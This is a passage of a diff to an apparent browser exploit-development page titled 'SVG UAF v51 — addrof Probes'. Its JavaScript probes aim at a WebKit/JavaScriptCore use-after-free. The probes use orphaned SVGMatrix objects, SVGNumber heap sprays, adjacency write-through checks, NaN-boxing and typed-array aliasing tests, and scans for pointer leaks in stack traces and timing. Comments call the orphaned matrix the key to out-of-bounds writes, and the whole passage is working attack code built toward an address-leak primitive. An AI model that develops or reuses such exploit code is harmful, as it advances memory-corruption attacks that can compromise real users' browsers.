+  L('OBJ4: artifacts found: '+artifacts+' (nonzero values in zeroed SVGNumbers)');
+  L('OBJ4: '+(artifacts>0?'★ POINTER BITS LEAKED into SVGNumber.value!':'no artifacts — fastMalloc zeroes confirmed'));
+
+  // Test 2: SVGMatrix adjacent to SVGNumber probe
+  // After SVGNumber IsoHeap spray, alloc SVGTransform
+  // If SVGMatrix C++ object lands adjacent to SVGNumber C++ objects...
+  // write to SVGMatrix fields, check if any SVGNumber.value changed
+  L('OBJ4: [Test 2] SVGMatrix adjacency to SVGNumber spray');
+
+  var svg2=makeSVG();
+  // First spray SVGNumbers to fill IsoHeap pages
+  var numRefs=[];
+  var f2=document.createElementNS(SVG_NS,'feColorMatrix');
+  f2.setAttribute('type','matrix');f2.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
+  var filt2=document.createElementNS(SVG_NS,'filter');filt2.setAttribute('id','fo2x');
+  filt2.appendChild(f2);svg2.appendChild(filt2);
+  var bl2=f2.values.baseVal;bl2.clear();
+  for(var i=0;i<20;i++){var n=getTmp().createSVGNumber();n.value=3000+i;bl2.appendItem(n);numRefs.push(bl2.getItem(bl2.length-1));}
+  filt2.parentNode.removeChild(filt2);
+  // Now alloc SVGTransform (gets SVGMatrix)
+  var g2=document.createElementNS(SVG_NS,'g');svg2.appendChild(g2);
+  var xf2=svg2.createSVGTransform();g2.transform.baseVal.appendItem(xf2);
+  var m2=g2.transform.baseVal.getItem(0).matrix;
+  // Write large value to m2.a (float64)
+  m2.a=1e30;m2.b=2e30;m2.c=3e30;m2.d=4e30;m2.e=5e30;m2.f=6e30;
+  // Check if any SVGNumber changed
+  var changed=0;
+  for(var i=0;i<numRefs.length;i++){
+    var v=numRefs[i].value;
+    if(v!==3000+i){changed++;L('OBJ4: [T2] numRef['+i+'] changed: was='+(3000+i)+' got='+v,'hit');}
+  }
+  L('OBJ4: [T2] changed='+changed+'/20 '+(changed>0?'★ ADJACENCY WRITE-THROUGH!':'no adjacency'));
+
+  // Test 3: DOMMatrix → JSC confusion probe
+  // DOMMatrix is a JS-native object (not SVG C++)
+  // Its internal storage: each field is a C++ double
+  // The JSC wrapper for DOMMatrix uses a different memory region than SVGMatrix
+  // Can we find ANY object whose address appears in a DOMMatrix field?
+  L('OBJ4: [Test 3] DOMMatrix field zero-read probe');
+  var dm=new DOMMatrix();
+  // Read all fields BEFORE writing — should all be identity values (0 or 1)
+  var identity_fields=['a','b','c','d','e','f','m11','m12','m13','m14','m21','m22','m23','m24','m31','m32','m33','m34','m41','m42','m43','m44'];
+  var nonzero=[];
+  for(var i=0;i<identity_fields.length;i++){
+    var v=dm[identity_fields[i]];
+    if(v!==0&&v!==1) nonzero.push({f:identity_fields[i],v:v});
+  }
+  L('OBJ4: [T3] DOMMatrix() initial non-identity fields: '+nonzero.length);
+  for(var i=0;i<nonzero.length;i++) L('OBJ4: [T3] '+nonzero[i].f+'='+nonzero[i].v);
+
+  removeSVG(svg);removeSVG(svg2);
+}
+
+// ─────────────────────────────────────────────────────────────────
+// OBJ6 — Stack / toString / Error address leak
+// Some JSC versions historically leaked object addresses in:
+// - Error.stack (line numbers, function addresses)
+// - Function.prototype.toString()
+// - Object.prototype.toString()
+// - Performance timing (Spectre residue)
+// - RegExp lastIndex
+// ─────────────────────────────────────────────────────────────────
+function runOBJ6(){
+  L('','suite-hdr');L('OBJ6: Error.stack / toString / timing address leak');
+
+  // Test 1: Error.stack
+  var e=new Error('test');
+  var stack=e.stack||'(no stack)';
+  L('OBJ6: [T1] Error.stack:');
+  // Print first 500 chars
+  L(stack.slice(0,500));
+  // Look for hex patterns that look like addresses (0x1[0-9a-f]{8,})
+  var hex_matches=stack.match(/0x[0-9a-f]{8,}/gi)||[];
+  L('OBJ6: [T1] hex patterns in stack: '+hex_matches.length);
+  for(var i=0;i<hex_matches.length;i++) L('OBJ6: [T1] found: '+hex_matches[i],'hit');
+
+  // Test 2: Function.prototype.toString
+  function testFn(){}
+  var fnStr=testFn.toString();
+  L('OBJ6: [T2] Function.toString(): '+fnStr.slice(0,100));
+  var fnHex=fnStr.match(/0x[0-9a-f]{6,}/gi)||[];
+  L('OBJ6: [T2] hex in fn.toString: '+fnHex.length);
+
+  // Test 3: native function toString (may reveal JIT addresses)
+  var nativeStr=Math.sin.toString();
+  L('OBJ6: [T3] Math.sin.toString(): '+nativeStr);
+  var nativeHex=nativeStr.match(/0x[0-9a-f]{6,}/gi)||[];
+  L('OBJ6: [T3] hex in native fn: '+nativeHex.length+(nativeHex.length>0?' ★ '+nativeHex[0]:''));
+
+  // Test 4: Error.lineNumber / columnNumber / fileName
+  try{null.x;}catch(e2){
+    L('OBJ6: [T4] caught error: '+e2.message);
+    L('OBJ6: [T4] lineNumber='+e2.lineNumber+' column='+e2.column+' fileName='+e2.fileName);
+    L('OBJ6: [T4] stack='+((e2.stack||'').slice(0,200)));
+  }
+
+  // Test 5: performance.now() precision (Spectre residue check)
+  var times=[];
+  for(var i=0;i<10;i++) times.push(performance.now());
+  L('OBJ6: [T5] performance.now() samples: '+times.slice(0,5).map(function(t){return t.toFixed(6);}).join(', '));
+  L('OBJ6: [T5] resolution: '+(times[1]-times[0]).toFixed(9)+'ms');
+
+  // Test 6: RegExp lastIndex leak (historical JSC bug)
+  var re=/(a+)+$/;
+  var testStr='aaaaaaaaaaaaaaaa!';
+  try{
+    re.test(testStr);
+    L('OBJ6: [T6] RegExp.lastIndex='+re.lastIndex);
+  }catch(ex){L('OBJ6: [T6] regex threw: '+ex.message);}
+
+  // Test 7: Symbol description / well-known symbols
+  var sym=Symbol('test');
+  L('OBJ6: [T7] Symbol.toString()='+sym.toString());
+
+  // Test 8: ArrayBuffer address probe via DataView offset trick
+  // Create two ArrayBuffers back to back, measure if indices overlap
+  var ab1=new ArrayBuffer(256);
+  var ab2=new ArrayBuffer(256);
+  var dv1=new DataView(ab1);
+  var dv2=new DataView(ab2);
+  dv1.setUint32(0,0xDEADBEEF,true);
+  dv2.setUint32(0,0xCAFEBABE,true);
+  // If ab2 is adjacent to ab1, writing past ab1's end would affect ab2
+  // We can't do OOB write in JS normally — but we have orphaned SVGMatrix!
+  // This is the key: use SVGMatrix float64 write on orphaned C++ object
+  // to see if it bleeds into adjacent ArrayBuffer
+  L('OBJ6: [T8] ArrayBuffer adjacency via SVGMatrix write...');
+  // Can't directly — would need to know addresses. Skip for now.
+  L('OBJ6: [T8] skipped (needs addrof first)');
+
+  // Test 9: JSC JIT code address via exception handling
+  // Some engines expose code addresses through .stack line numbers
+  // that correlate with JIT-compiled function addresses
+  function jitMe(x){
+    // Force JIT compilation with a hot loop
+    var sum=0;
+    for(var i=0;i<1000;i++) sum+=x*i;
+    return sum;
+  }
+  for(var i=0;i<100;i++) jitMe(i); // warm up
+  try{
+    var jitErr=null;
+    (function(){try{null.x;}catch(e){jitErr=e;}})();
+    if(jitErr&&jitErr.stack){
+      var jitHex=(jitErr.stack.match(/0x[0-9a-f]{8,}/gi)||[]);
+      L('OBJ6: [T9] JIT error stack hex: '+jitHex.length+(jitHex.length>0?' first: '+jitHex[0]:''));
+    }
+  }catch(ex){}
+
+  L('OBJ6: done');
+}
+
+// ─────────────────────────────────────────────────────────────────
+// OBJ7 — JSValue oracle
+// In JSC, JS values are NaN-boxed 64-bit values.
+// Double: stored directly. Object ptr: upper bits = 0xFFFF (or tag)
+// Can we use SVGMatrix.inverse() to decode a JSValue?
+//
+// Approach: get a JS object "into" an SVGMatrix field somehow.
+// JSC Float64Array: each element IS a raw float64 in memory.
+// Float64Array[0] = arbitrary f64 bits.
+// If we can alias Float64Array's backing store with SVGMatrix fields...
+// ─────────────────────────────────────────────────────────────────
+function runOBJ7(){
+  L('','suite-hdr');L('OBJ7: JSValue / Float64Array oracle probe');
+
+  // Test 1: Float64Array stores exact float64 bits
+  var fa=new Float64Array(8);
+  fa[0]=1/3;
+  L('OBJ7: [T1] Float64Array stores f64: '+fa[0]+' exact='+(fa[0]===1/3));
+
+  // Test 2: write NaN bits to Float64Array, read back
+  // In JSC, object references are NaN-boxed: 0xFFFF000000000000 | ptr
+  // A "poisoned NaN" f64 would have upper bits = 0xFFFF
+  var nan_val=NaN;
+  fa[0]=nan_val;
+  var dv=new DataView(fa.buffer);
+  var nan_hi=dv.getUint32(0,false);var nan_lo=dv.getUint32(4,false);
+  L('OBJ7: [T2] NaN bits: hi=0x'+nan_hi.toString(16)+' lo=0x'+nan_lo.toString(16));
+
+  // Test 3: write various "tagged" bit patterns to Float64Array
+  // JSC pointer encoding: doubles are stored as-is if they're valid doubles
+  // Objects are encoded as: 0xFFFF000000000000 | 32-bit ptr (on 32-bit)
+  // On 64-bit arm64: pointers are 48-bit, encoded differently
+  // JSC on arm64 uses: if bits are a valid f64, it's a double
+  //                    if upper 16 bits = 0xFFFF, it's an object ptr
+  var jsval_patterns=[
+    {hi:0xFFFF0000,lo:0x00001234,name:'JSC obj-ptr-like (32-bit style)'},
+    {hi:0xFFFC0000,lo:0x00000000,name:'JSC NaN tag'},
+    {hi:0x00000000,lo:0x00000001,name:'small int as f64'},
+  ];
+  for(var i=0;i<jsval_patterns.length;i++){
+    var p=jsval_patterns[i];
+    dv.setUint32(0,p.hi,false);dv.setUint32(4,p.lo,false);
+    var got=fa[0];
+    L('OBJ7: [T3] pattern '+p.name+': hi=0x'+p.hi.toString(16)+' lo=0x'+p.lo.toString(16)+' → f64='+got+' isNaN='+isNaN(got)+' isFinite='+isFinite(got));
+  }
+
+  // Test 4: Float64Array + SVGMatrix — can they share memory?
+  // Create Float64Array with known values, then create SVGMatrix
+  // If they're adjacent, writing past Float64Array end would hit SVGMatrix
+  // We can't do OOB in JS. But: can we get Float64Array.buffer ptr from SVGMatrix?
+  // Set up: SVGMatrix with values matching Float64Array entries
+  var fa2=new Float64Array([1.1,2.2,3.3,4.4,5.5,6.6]);
+  var svg=makeSVG();
+  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
+  var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
+  var m=g.transform.baseVal.getItem(0).matrix;
+  // Copy Float64Array values into SVGMatrix
+  m.a=fa2[0];m.b=fa2[1];m.c=fa2[2];m.d=fa2[3];m.e=fa2[4];m.f=fa2[5];
+  L('OBJ7: [T4] SVGMatrix loaded with Float64Array values: a='+m.a+' b='+m.b);
+  // Orphan matrix
+  g.transform.baseVal.removeItem(0);g.parentNode.removeChild(g);removeSVG(svg);
+  // Can we still do oracle on orphaned matrix loaded from Float64Array?
+  try{
+    var inv=m.inverse();
+    L('OBJ7: [T4] orphaned matrix inverse: a='+m.a+' inv.a='+inv.a);
+  }catch(ex){L('OBJ7: [T4] THREW: '+ex.message);}
+
+  // Test 5: TypedArray view aliasing
+  // Uint32Array and Float64Array over same ArrayBuffer
+  var ab=new ArrayBuffer(64);
+  var u32=new Uint32Array(ab);
+  var f64=new Float64Array(ab);
+  // Write a "pointer" value as two uint32s, read as float64
+  var hi=0x41f8,lo=0x00123456; // encodes a ~6442455126 f64
+  u32[0]=lo;u32[1]=hi<<16;     // little-endian: lo at 0, hi at 4
+  L('OBJ7: [T5] aliased view: u32[0]=0x'+u32[0].toString(16)+' u32[1]=0x'+u32[1].toString(16)+' → f64[0]='+f64[0]);
+
+  // Write known pointer-like value via float64, read as u32 pair
+  f64[1]=0x1b0001234; // pointer-like value
+  L('OBJ7: [T5b] f64=0x1b0001234 → u32[2]=0x'+u32[2].toString(16)+' u32[3]=0x'+u32[3].toString(16));
+  // Verify round-trip
+  var dv2=new DataView(ab);
+  var lo2=dv2.getUint32(8,true);var hi2=dv2.getUint32(12,true);
+  L('OBJ7: [T5c] round-trip: hi=0x'+hi2.toString(16)+' lo=0x'+lo2.toString(16));
+  L('OBJ7: done');
+}
+
+// ─────────────────────────────────────────────────────────────────
+// OBJ8 — WeakRef / FinalizationRegistry / GC timing
+// WeakRef holds a weak reference — doesn't prevent GC
+// FinalizationRegistry: callback fires when object is collected
+// Can we time GC to infer heap layout?
+// ─────────────────────────────────────────────────────────────────
+function runOBJ8(){
+  L('','suite-hdr');L('OBJ8: WeakRef / FinalizationRegistry / GC timing');
+
+  // Test 1: WeakRef availability
+  if(typeof WeakRef==='undefined'){L('OBJ8: WeakRef not available','miss');return;}
+  L('OBJ8: WeakRef available');
+
+  // Test 2: FinalizationRegistry
+  if(typeof FinalizationRegistry==='undefined'){L('OBJ8: FinalizationRegistry not available','miss');}
+  else{
+    L('OBJ8: FinalizationRegistry available');
+    var collected=[];
+    var fr=new FinalizationRegistry(function(v){
+      collected.push(v);
+      L('OBJ8: ★ GC collected: '+v,'hit');
+    });
+    // Register some objects
+    (function(){
+      var objs=[];
+      for(var i=0;i<10;i++){
+        var o={id:i,data:new Array(100).fill(i)};
+        fr.register(o,'obj-'+i);
+        objs.push(o);
+      }
+      // Let objs go out of scope
+    })();
+    // Trigger GC
+    try{if(typeof gc==='function'){gc();L('OBJ8: gc() called');}}catch(e){}
+    // Note: callbacks are async, won't fire synchronously
+    L('OBJ8: collected so far (sync): '+collected.length+' (may fire later async)');
+  }
+
+  // Test 3: WeakRef deref timing
+  var wr=null;
+  (function(){var o={secret:42};wr=new WeakRef(o);})();
+  // o might be collected now
+  var deref=wr.deref();
+  L('OBJ8: WeakRef.deref() after scope exit: '+(deref?'still alive ('+deref.secret+')':'COLLECTED'));
+
+  // Test 4: GC timing oracle
+  // Alloc many SVGNumbers, orphan them, check if GC reclaims
+  // timing-based: if GC runs, performance.now() jumps
+  L('OBJ8: [T4] GC timing probe');
+  var t0=performance.now();
+  // Spray 1000 objects
+  var spray=[];
+  for(var i=0;i<1000;i++) spray.push({a:new Array(50).fill(i),b:i});
+  var t1=performance.now();
+  spray=null; // release
+  try{if(typeof gc==='function')gc();}catch(e){}
+  var t2=performance.now();
+  // Alloc SVGNumbers post-GC
+  var svg=makeSVG();
+  var f=document.createElementNS(SVG_NS,'feColorMatrix');
+  f.setAttribute('type','matrix');f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
+  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','fg8');
+  filt.appendChild(f);svg.appendChild(filt);
+  var bl=f.values.baseVal;bl.clear();
+  var postGCRefs=[];
+  for(var i=0;i<20;i++){var n=getTmp().createSVGNumber();n.value=0;bl.appendItem(n);postGCRefs.push(bl.getItem(bl.length-1));}
+  filt.parentNode.removeChild(filt);
+  var t3=performance.now();
+  L('OBJ8: [T4] alloc='+((t1-t0).toFixed(2))+'ms release+gc='+((t2-t1).toFixed(2))+'ms svgAlloc='+((t3-t2).toFixed(2))+'ms');
+
+  // Check if post-GC SVGNumbers have nonzero values (ptr residue)
+  var residue=0;
+  for(var i=0;i<postGCRefs.length;i++){var v=postGCRefs[i].value;if(v!==0){residue++;L('OBJ8: [T4] residue! ref['+i+']='+v,'hit');}}
+  L('OBJ8: [T4] residue count='+residue+' '+(residue>0?'★ PTR BITS SURVIVED GC!':'clean — fastMalloc zeroes confirmed'));
 
   removeSVG(svg);
+  L('OBJ8: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
 // RUN ALL
 // ─────────────────────────────────────────────────────────────────
-L('SVG UAF v50 — Address Oracle: ADR1/ADR2/ADR3/ADR4/ADR5');
-L('----------------------------------------------------');
-var r1=runADR1();
-var r2=runADR2();
-var r3=runADR3();
-var r4=runADR4();
-runADR5();
+var suites={
+  OBJ3:runOBJ3,
+  OBJ4:runOBJ4,
+  OBJ6:runOBJ6,
+  OBJ7:runOBJ7,
+  OBJ8:runOBJ8
+};
 
-L('');
-L('ADR1: inverse() integer echo');
-L(r1.all_echo?'★ ALL ECHO EXACT — oracle works for K up to MAX_SAFE_INT':'partial echo');
-L('ADR2: SVGPoint.matrixTransform()');
-L('ADR3: DOMMatrix operations');
-L('ADR4: SVGMatrix/DOMMatrix as float64 register');
-L('ADR5: layout/style leak probe');
-L('');
-L('KEY QUESTION: Can we use inverse() to recover values > 2^53?');
-L('arm64 heap pointers are ~44 bits — safely within 2^53 = 53-bit safe integer range');
-L('If K=heapaddr fits in 2^53 → oracle works for real addresses');
+function runSuite(name){
+  L('=== '+name+' ===','suite-hdr');
+  try{suites[name]();}catch(ex){L(name+' UNCAUGHT: '+ex.message+'\n'+ex.stack,'miss');}
+  L('=== '+name+' done ===','info');
+}
+
+function runAll(){
+  clearOut();
+  L('SVG UAF v51 — addrof Probes','suite-hdr');
+  L('----------------------------------------------------');
+  var names=Object.keys(suites);
+  var i=0;
+  function next(){
+    if(i>=names.length){L('','suite-hdr');L('ALL SUITES COMPLETE');return;}
+    runSuite(names[i++]);
+    setTimeout(next,50);
+  }
+  next();
+}
 </script>
 </body>
 </html>
